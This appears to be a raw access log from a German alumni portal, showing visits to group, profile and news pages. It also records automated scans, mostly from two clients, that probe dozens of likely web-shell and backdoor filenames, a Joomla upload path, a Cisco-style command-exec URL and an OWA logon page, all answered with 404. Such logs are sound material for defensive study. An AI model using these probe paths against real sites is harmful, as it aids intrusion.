042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:06:52;;/wp-admin/about.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:06:53;;/readme.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:06:53;;/v.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:06:54;;/sck.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:06:55;;/X7x.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:06:56;;/xpass.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:06:56;;/bless.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:06:57;;/bless2.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:06:58;;/bless6.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:06:59;;/bless10.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:00;;/bless11.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:00;;/wp-admin/js/index.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:01;;/thoms.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:02;;/xsas.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:03;;/xrp.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:04;;/wp-freya.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:04;;/css/index.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:05;;/file30.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:06;;/fesa.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:07;;/class-.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:07;;/.well-known/gecko-litespeed.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:08;;/up.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:09;;/403.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:10;;/9v6.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:11;;/lte7.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:11;;/1vbqo.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:12;;/l10n.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:13;;/tajj.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:14;;/fdd2.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:15;;/class9.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:15;;/sto.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:16;;/7h.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:17;;/fh26.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:18;;/ixj.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:18;;/x23.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:19;;/zeu.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:20;;/f2r4.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:21;;/lopst.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:22;;/gecko.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:22;;/0xs.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:23;;/Zeiss.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:24;;/x0x.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:25;;/adin.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:26;;/mans.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:26;;/O-Simple.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:27;;/wp-ana.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:28;;/hans.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:29;;/ctex1.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:29;;/class19.php;GET;404
042b52e1398c45e11c5a605d313de642498456caf680ac0a1bd7c3deb19ddbaa;2025-11-09 18:07:30;;/class20.php;GET;404
208dd17bf4b83e195335bd7d827312ad4212b5acd0fbb6cb691e1614a3261e4f;2025-11-09 18:13:18;;/gruppen/hobby/geschichte;GET;302
9ca84a0ecac52bfb4cdb853dc83b6b5b244ce2b2ea5b6666cee4cecc138dd231;2025-11-09 18:19:51;;/;GET;200
ae4f6e2e520a43bc97446abb525e9c078c585680695a0df82a5fb0ccc8755b80;2025-11-09 18:21:30;;/aktuelles/stellenangebote;GET;200
aee6cb082c780a8f6860ccbb8ccf4c396fcba2c985ec21d6c3b65eace7a7ed04;2025-11-09 18:22:37;;/;GET;200
43160f63c4c39ba2dcbf890346840ad280bfe50f68e467dc13ed732f64b05b85;2025-11-09 18:27:28;;/;GET;200
a091388303b495ef1b7fcd0f5373ddaf85ee47173c161d3d3dcdba86b9855298;2025-11-09 18:30:02;;/gruppen;GET;200
f7e8620a5830554441a685dfc8caa656f5265a99489f2b611b2b65cfa3f50861;2025-11-09 18:32:54;;/;GET;200
ef249aa48acd8d3d464ff7a4bd958045c7581fbee63f94e7cce2ddf7b2cc0194;2025-11-09 18:38:01;;/;GET;200
74af0ecd40ca86df4dbfca6bcaa4c2341397c468c635b4d7f5bcecd9d44c96c7;2025-11-09 18:38:25;;/gruppen/interesse/entrepreneurship;GET;200
f16a7b400f03ce57dc324a89d91e2068d5ea66fea37a4a111185f771b69ad4d5;2025-11-09 18:47:19;;/aktuelles/meldungen?category=wissenschaft;GET;200
d00899c6028233094732f6377be9e2da78ca7a013f6e95f117b85009713f3adf;2025-11-09 18:52:15;;/?page=docs-DT1-dea.md;GET;200
adb290a21a958e13e56aa29d549d28f83b68b3c11cc24ec2f3d48bf5f9657b0e;2025-11-09 18:55:42;;/personen/alumni/schule/67210;GET;200
c7b746455a8d7e92c9b862454c802ddb01108e08460ee02218bc747ce631b1b1;2025-11-09 18:57:22;;/gruppen/hobby/programmieren;GET;302
6d1f4669a2a8d5553f4267996d2c6d6742763938e0ccbbcbe9ddbf8967b5f1ba;2025-11-09 19:00:33;;/components/com_creativecontactform/fileupload/index.php?file=trg3hf.jpg;GET;404
a4bdc9d5f6f6cb5b63370df61d0bec9016f69606c1e4104528663d10573f8bfe;2025-11-09 19:04:30;;/personen/alumni/schule/5501;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-09 19:04:58;;/veranstaltungen;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-09 19:06:11;;/register;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-09 19:07:34;;/personen/alumni/schule/0351;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-09 19:08:48;;/login;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-09 19:10:12;;/about/allgemein;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-09 19:11:43;;/;GET;200
0a6c96ee143f1730f5295adcfbfe157c693c4779865140b44ff25ec533568d3f;2025-11-09 19:11:54;;/;GET;200
372bcaf3828d251fb25d2cbfbfd84f3b9c7c826503528445dc3b319ec99fe2fa;2025-11-09 19:13:10;;/personen/alumni/schule/5514;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-09 19:13:14;/themen/details/erfolgreich-durch-die-abiturprufungen;/themen/details/gemeinsam-stark-organisiert;GET;200
39e13d3ba23796c1f1fcf026bdd16c9cd5a3bae490d10b5e068c238246787ea7;2025-11-09 19:13:46;;/;GET;200
03a51f69213ae2543dc8d58037bbbf8fb63b31c67bdaa20548ac6c23c2f3fb5e;2025-11-09 19:13:53;;/level/15/exec/-/sh/run/CR;GET;404
d431cb7ba8d21af206348ca2bf25903d7f66c1723d25d3abcaa8b3a0f25cb0b4;2025-11-09 19:13:59;;/owa/auth/logon.aspx;GET;404
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-09 19:14:34;/personen/alumni/schule/5502;/personen/alumni/schule/MP001;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-09 19:15:46;/personen/alumni/schule/5502;/personen/alumni/schule/164045;GET;200
6d3d10d8284674cda95faa90d17f71dc6dbae776ced85eaec1f51590c145b2c9;2025-11-09 19:20:24;;/personen/alumni/schule/4240016;GET;200
d30fbb87448d64b0261d5d07306a850b951c3cf6688f105df0f7b2987c0506b5;2025-11-09 19:23:23;;/sitemaps.xml;GET;404
74520e7566df6eb0643621903cde18cbafd42dce0d87978b3adebc7fa4940926;2025-11-09 19:28:37;;/gruppen/hobby/fotobearbeitung;GET;302
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-09 19:33:17;;/;GET;200
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-09 19:33:20;/;/;GET;200
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:35;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:37;;/qa.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:38;;/wp-content/plugins/edaewni/index.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:39;;/chosen.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:40;;/wxo.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:41;;/wp-admin/includes/xmrlpc.php?p=;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:42;;/wp-includes/fonts/index.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:43;;/wp-includes/images/wp-login.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:44;;/02.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:45;;/abcd.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:45;;/error.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:46;;/yy.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:47;;/.well-known/index.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:49;;/6.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:49;;/class.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:50;;/mail.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:51;;/lv.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:52;;/zwso.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:53;;/filemanager/dialog.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:54;;/r.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:55;;/admin/function.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:56;;/js/fm.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:57;;/buy.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:58;;/s.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:33:58;;/akcc.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:00;;/qing.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:00;;/w.php?p=;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:01;;/wp-admin/images/singlep.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:02;;/.well-known/pki-validation/alfacgiapi/wawe_gH298.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:03;;/class20.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:04;;/vendor/nikic/php-parser/parser.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:05;;/upload/wp-info.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:06;;/wp-content/themes/about.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:06;;/wp-includes/assets/index.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:07;;/cf.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:08;;/bak.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:09;;/AxAo.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:10;;/worksec.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:11;;/chosen.php?;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:12;;/sx.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:12;;/minik.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:13;;/d2.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:14;;/wp-content/about.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:15;;/index/function.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:16;;/456.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:17;;/wp-includes/block-patterns/index.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:18;;/wp-gr.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:19;;/admin/upload/css.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:20;;/berlin.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:20;;/themes.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:21;;/css/index.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:22;;/wp-includes/Text/Diff/Engine/about.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:23;;/13k.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:24;;/web/wp-login.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:25;;/c.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:26;;/ioxi002.PhP7;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:27;;/file.php?;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:28;;/info/info.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:29;;/.well-known/log.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:29;;/uwu2.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:30;;/filename.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:32;;/20.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:32;;/wp-includes/theme-compat/wp-login.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:33;;/wp-includes/widgets//include.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:34;;/jp.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:35;;/wp-2019.php?;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:36;;/fw.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:36;;/wp-content/plugins/index.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:37;;/a.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:38;;/manager.php?p=;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:39;;/a1.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:40;;/inputs.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:41;;/wp-includes/theme-compat/chosen.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:42;;/w.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:43;;/7.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:44;;/V3.php;GET;404
a86daea02a35922a104299cad3d469ba26bfdb72fd5155874a354620e1929cdd;2025-11-09 19:34:44;;/config.php;GET;404
99a388e9a92cb69992f545c6e01e2bc0a0fb214bbf4f127fd1e296258c3573cf;2025-11-09 19:36:32;;/gruppen/hobby/journalismus;GET;302
c734c15f24237ef26098e52d6675b024b364fd5eea84d16dd6b814cfcb348749;2025-11-09 19:46:22;;/aktuelles/stellenangebote;GET;200
0a53638b20d332f8a208fc04295fc7a2229d8d9dbada736f296296e1a8bb4fbc;2025-11-09 19:52:50;;/;GET;200
fa6770bc014bf01a53892bd32ed574c1fa86229c39739ad5ed83930c826641bb;2025-11-09 19:53:10;;/themen/details/abschied-aus-moabit;GET;200
c74a664eb02698bbfc31976fb98c315b496e1ac01c352588386d90b24b49c597;2025-11-09 19:57:10;;/gruppen/interesse/weiterbildung-und-training;GET;200
53b4d797a852dbacd6478567d93b696d7bf380ecb97982ed81c05ed191c7b6ce;2025-11-09 20:03:33;;/;GET;200
91b86a99a2906a16a35eebd5df4d25a3a8858869ad754393c8b42f6798883ed3;2025-11-09 20:07:17;;/gruppen/interesse/selbststandigkeit;GET;200
ef705c9bbd2ae96b6c7fd2fe8f3180f01673ace388845203c756b945454a078f;2025-11-09 20:12:36;/rechtliches/green-data;/rechtliches/green-data;GET;200
44ff2709cdb859c57cbfbc3ebf533d33410df4b606aa88000acfbdef1fc21ee7;2025-11-09 20:15:57;;/personen/alumni/schule/HS001;GET;200
bbdced1c2032d061c920aa5d349fadc41a17ade0dbc74892411800c3e813ce3e;2025-11-09 20:20:54;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
0ab2e97e39fdc5138082d4a42f9bcb49c471b9aeb6a959b635266092cf4508d0;2025-11-09 20:23:27;;/sitemaps.xml;GET;404
68ba8aedfcafdacc01add104ebf75bab4470e5ab636cbbb4090edc0ac477dbaf;2025-11-09 20:24:38;;/personen/alumni/schule/HS002;GET;200
e6c7fcb88eb51662a7024b35819a8828731501717237cb3681943c39e51129bf;2025-11-09 20:29:06;;/;GET;200
be707718164886078eef3bb5d1cd050775bdeb335a5d1f4c4e84f33e0afb33d6;2025-11-09 20:29:10;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
fc8e8072aed052585b3cf33090ee1288fd33cf5dcd6701a2a75364cbe2e62403;2025-11-09 20:32:55;;/;GET;200
fc8e8072aed052585b3cf33090ee1288fd33cf5dcd6701a2a75364cbe2e62403;2025-11-09 20:33:23;;/;GET;200
0f56ac083e213fd0719873126f024c467c069de49a8c926edcf9a4c0a28e1b6f;2025-11-09 20:33:46;;/gruppen/interesse/gesundheitswesen-und-pflege;GET;200
4f2050e39b2b8672456c295ce378d7dbd2cd5bec810b370dad55b010afc2a123;2025-11-09 20:39:05;;/aktuelles/meldungen?category=wissenschaft;GET;200
48c31a3bdca03ba471bbfc3b6d4587d5863e8c938f54c02764c85fbef591b991;2025-11-09 20:42:08;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
9947d43c080a271290c6371f6ef94fb7d9946e15acbf6d823bb0d05f378c3290;2025-11-09 20:43:25;;/gruppen/interesse/projektmanagement;GET;200
0ab2e97e39fdc5138082d4a42f9bcb49c471b9aeb6a959b635266092cf4508d0;2025-11-09 20:44:37;;/?page=docs-mathematik-analysis.md;GET;200
bb378c80b7ea87ef9cefb6a093c199c8c2a386d94f261764999733993c2ff59a;2025-11-09 20:47:53;;/;GET;200
8dce3f89b9dde903842230c16f9b919774db5ea134069a3c5a13087e3ae18bb0;2025-11-09 20:51:08;;/gruppen/hobby/skulptur;GET;302
96b04319f791c3da19bc84913f09e678f079914c02c5c58a35aa80df27ca79c4;2025-11-09 20:51:31;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-09 20:52:08;;/;GET;200
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-09 20:52:35;;/;GET;200
373d2c3040adbb01cf965f977759d5cac211ac9ce3b76a698834759da9cf468c;2025-11-09 20:53:13;;/login;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-09 20:56:40;/gruppen/hobby/skulptur;/gruppen/hobby/musikinstrumente-spielen;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-09 20:56:42;/gruppen/hobby/skulptur;/gruppen;GET;200
55f62319318778e7df980ba8a577d9693e87c149f6f1bea5e17980efd8796c9e;2025-11-09 20:59:50;;/gruppen/interesse/kommunikationsfahigkeiten;GET;200
ac1021e770633ff69bd6b5c57d918fa1dac8acac4e787c186993bda4c3c0d4cd;2025-11-09 21:01:45;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
3d83c5854ffb1ef8408066708d09c3b34f40c34db9c081b9d8a66cfb31ed30af;2025-11-09 21:08:18;;/rechtliches/datenschutz;GET;200
3811dc48286476a984fd01a8c20fc0f058804643dcab4209ebc024993036eda4;2025-11-09 21:10:09;;/themen/details/abschied-aus-moabit;GET;200
a8f2c145316b032bfdab21a0f208d2cc6fd3d6f7c4d15498fa00934df568504a;2025-11-09 21:13:23;;/;GET;200
aee6cb082c780a8f6860ccbb8ccf4c396fcba2c985ec21d6c3b65eace7a7ed04;2025-11-09 21:15:07;;/;GET;200
aaddafae71ed08f5ecf13f69559499515aa73dd15f6ddb30f0f012a23d19b3a9;2025-11-09 21:17:35;;/rechtliches/green-data;GET;200
8710226a8e1aad35fe2fb671859ecd878de32503cebcdd5ad62d75b1be6006b0;2025-11-09 21:17:50;;/themen/details/hackerangriff-lauft-ins-leere;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-09 21:18:11;/personen/alumni/schule/5502;/personen/alumni/schule/59000;GET;200
2cc4d083e1d47cc6fbdc499f66a5864a06ea0022447b21a1b0fc3b6d68c968b7;2025-11-09 21:21:22;/;/;GET;200
b10b559294de1619c0c4daef878a182ac03a3a738cdb3d0fbf72cea19cbea5f2;2025-11-09 21:26:23;;/rechtliches/impressum;GET;200
c47e91b15039dc45854d403740948a0cc410082c4781ad7f3dc6d844e2b3eeb0;2025-11-09 21:32:11;;/?page=docs-software-java_ide.md;GET;200
c929ee95730ba6ef1ee48df48ee60b2a042192c5b52fb38566d40c91ed8cce13;2025-11-09 21:34:48;;/personen/alumni/schule/MP002;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-09 21:36:25;;/;GET;200
f24d1909caea35c97685618b89a62a5847bffca73091a5173f5c01f6efaee5f1;2025-11-09 21:37:04;;/themen?category=wissenschaft;GET;200
422210cb114db9acbfec12e533bfd44e6020f3c25a28746ba685e811fe9c928d;2025-11-09 21:43:15;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
a801674c846c72292dca22ac352d76e8832e61b09951400c0aa9cacbc2cf92c5;2025-11-09 21:49:39;/personen/all/2;/personen/all/2;GET;200
35f8cc141b933e367984e06543d9731db089b98ceadedfbeb3b34f7dfde3fb5e;2025-11-09 21:54:34;;/personen/alumni/schule/68470;GET;200
fff960afc3cc7156ed6ba49ee0b20a63c8a2b640b1933e331dfcaaf84d895d40;2025-11-09 21:55:52;;/;GET;200
fff960afc3cc7156ed6ba49ee0b20a63c8a2b640b1933e331dfcaaf84d895d40;2025-11-09 21:55:52;;/;GET;200
aea835069d06e39b77ecade27575a9194b085ca23ec9972bdcf5d627ce27564d;2025-11-09 22:13:10;;/;GET;200
